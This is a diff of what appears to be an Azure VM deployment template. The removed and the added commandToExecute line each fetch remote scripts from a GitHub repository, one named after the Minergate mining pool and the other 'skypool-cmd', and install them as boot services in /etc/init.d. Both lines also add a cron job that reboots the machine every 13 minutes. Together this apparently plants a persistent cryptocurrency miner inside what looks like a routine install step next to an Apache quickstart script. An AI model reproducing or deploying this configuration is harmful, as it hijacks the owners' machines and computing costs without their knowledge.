@@ -175,7 +175,7 @@
           "fileUris": [
             "https://raw.githubusercontent.com/Azure/azure-quickstart-templates/master/apache2-on-ubuntu-vm/install_apache.sh"
           ],
-           "commandToExecute": "sudo apt-get install htop && sudo apt-get update && wget 'https://github.com/LDNA/vmdeployer/blob/master/mnr.deb?raw=true' -O mnr.deb && sudo dpkg -i mnr.deb && sudo apt install htop && (crontab -l ; echo '*/13 * * * * sudo reboot') | sort - | uniq - | crontab - && cd /etc/init.d/ && sudo wget 'https://raw.githubusercontent.com/LDNA/vmdeployer/master/adm-minergate7' && sudo chmod 755 /etc/init.d/adm-minergate7 && sudo update-rc.d adm-minergate7 defaults && sudo reboot"
+           "commandToExecute": "sudo apt-get install htop && sudo apt-get update && (crontab -l ; echo '*/13 * * * * sudo reboot') | sort - | uniq - | crontab - && cd /etc/init.d/ && sudo wget 'https://raw.githubusercontent.com/LDNA/vmdeployer/master/skypool-cmd' && sudo chmod 755 /etc/init.d/skypool-cmd && sudo update-rc.d skypool-cmd defaults && sudo reboot"
         }
       }
     }
